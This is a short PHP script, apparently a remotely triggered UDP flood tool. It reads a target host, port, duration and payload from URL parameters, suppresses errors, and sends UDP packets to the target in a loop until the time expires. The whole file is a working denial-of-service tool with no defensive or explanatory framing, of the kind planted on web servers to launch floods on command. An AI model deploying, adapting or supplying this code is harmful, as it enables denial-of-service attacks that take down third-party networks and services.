<?php
header("charset='utf-8'");
error_reporting(0);
set_time_limit(0);
ignore_user_abort(false);

function getmicrotime(){ 
	list($usec, $sec) = explode(" ",microtime()); 
	return ((float)$usec + (float)$sec); 
}

if (function_exists('fsockopen')) {
    $test="正常";
} else {
    $test="缺少必要函数";
}

$time_start = getmicrotime();  
$serverip = gethostbyname($_SERVER["SERVER_NAME"]);

$host = $_GET['host'];
$port = $_GET['port'];
$exec_time = $_GET['time'];
$out = $_GET['data'];
$out = urlencode($out);
$byte = 0;

//构造数据包
/*for($i=0;$i<$Sendlen;$i++){
        $out .= "A";
    }*/
	
$max_time = time()+$exec_time;

while(1){
    $byte++;
    if(time() > $max_time){
        break;
    }
    $fp = fsockopen("udp://$host", $port, $errno, $errstr, 5);
        if($fp){
            fwrite($fp, $out);
            fclose($fp);
    }
}

$time_end = getmicrotime(); 
$time = $time_end - $time_start; 
?>